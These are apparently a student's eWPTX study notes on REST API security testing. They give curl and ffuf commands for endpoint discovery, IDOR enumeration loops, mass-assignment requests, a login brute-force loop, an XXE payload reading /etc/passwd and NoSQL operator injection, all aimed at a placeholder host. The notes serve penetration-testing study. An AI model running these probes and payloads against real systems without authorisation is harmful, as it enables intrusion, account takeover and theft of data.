2026-02-06

Status:

Tags: [[eWPTX]] [[Web Services]]
###### Prerequisites: [[REST (RESTful APIs)]]
# REST API Security Testing

## Overview

REST APIs expose application logic via HTTP endpoints. Testing follows similar principles to web app testing but with API-specific attack vectors.

---

## Enumeration

### Discovering endpoints

```bash
# Directory brute-force for API paths
ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Common API paths to try
/api/v1/ /api/v2/ /api/v3/
/graphql /swagger.json /openapi.json
/api-docs /api/docs /.well-known/

# Check for Swagger/OpenAPI docs
curl https://target.com/swagger.json
curl https://target.com/v2/api-docs
```

### HTTP method probing

```bash
# Test all methods on an endpoint
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  curl -s -o /dev/null -w "%{http_code} $method\n" -X $method https://target.com/api/users
done
```

---

## BOLA / IDOR (Broken Object-Level Authorization)

The most common API vulnerability (OWASP API #1).

```bash
# Authenticated as user 1, try accessing user 2's data
curl -H "Authorization: Bearer TOKEN_USER1" https://target.com/api/users/2

# Test sequential IDs
for i in $(seq 1 100); do
  curl -s -H "Authorization: Bearer $TOKEN" https://target.com/api/users/$i | grep -v "403"
done

# Test with UUID — try predictable patterns or leaked IDs
```

**What to look for**: Any endpoint that takes an object ID (user ID, order ID, file ID) and returns data without verifying the requester owns that object.

---

## Mass Assignment

Send extra fields the API doesn't expect:

```bash
# Normal user registration
curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123"}'

# Mass assignment attempt
curl -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123","role":"admin","isAdmin":true}'
```

Try common privilege fields: `role`, `admin`, `isAdmin`, `is_staff`, `privilege`, `group`, `permissions`

---

## Authentication Testing

### Token analysis

```bash
# Check if token is validated at all
curl -H "Authorization: Bearer invalid_token" https://target.com/api/me

# Check if expired tokens are accepted
# Decode JWT, check exp claim vs current time

# Check if signature is validated (JWT none algorithm)
# See: [[The None Algorithm Vulnerability (JWT)]]
```

### Rate limiting

```bash
# Test for brute-force protection
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://target.com/api/login \
    -d '{"username":"admin","password":"attempt'$i'"}'
done
```

---

## Content-Type Juggling

Some APIs accept multiple content types, and validation may differ:

```bash
# JSON (expected)
curl -X POST https://target.com/api/data \
  -H "Content-Type: application/json" \
  -d '{"query":"test"}'

# Try XML (may enable XXE)
curl -X POST https://target.com/api/data \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><query>&xxe;</query>'

# Try form-encoded
curl -X POST https://target.com/api/data \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'query=test'
```

---

## Verbose Error Exploitation

```bash
# Send malformed input to trigger stack traces
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"id": {"$gt": ""}}'

# Send wrong types
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"id": [1,2,3]}'
```

Look for: framework names, database types, internal paths, SQL queries in error messages.

---

## Testing Methodology

1. **Map**: Discover all endpoints, methods, and parameters
2. **Authenticate**: Test auth mechanisms (tokens, API keys, sessions)
3. **Authorize**: Test BOLA/IDOR on every object reference
4. **Input**: Test injection (SQLi, NoSQLi, command injection) on all parameters
5. **Content-Type**: Test XML injection, mass assignment
6. **Rate limit**: Test brute-force and resource exhaustion
7. **Errors**: Extract info from verbose error responses

---

## Tools

- **Postman**: Manual API testing and collection management
- **Burp Suite**: Proxy and scanner for API traffic
- **ffuf**: Endpoint and parameter fuzzing
- **Arjun**: Hidden parameter discovery
- **jwt_tool**: JWT testing and attacks
